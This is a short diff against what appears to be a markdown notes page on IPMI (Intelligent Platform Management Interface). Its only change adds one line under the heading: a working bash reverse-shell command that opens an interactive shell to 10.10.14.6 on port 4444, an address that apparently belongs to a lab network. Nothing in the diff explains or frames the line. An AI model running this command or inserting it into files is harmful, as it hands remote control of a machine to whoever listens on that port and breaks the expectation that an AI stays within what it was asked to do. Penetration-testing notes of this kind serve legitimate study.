@@ -1,4 +1,5 @@
 # IPMI – Intelligent Platform Management Interface
+bash -c 'bash -i >& /dev/tcp/10.10.14.6/4444 0>&1'
 
 ---
 
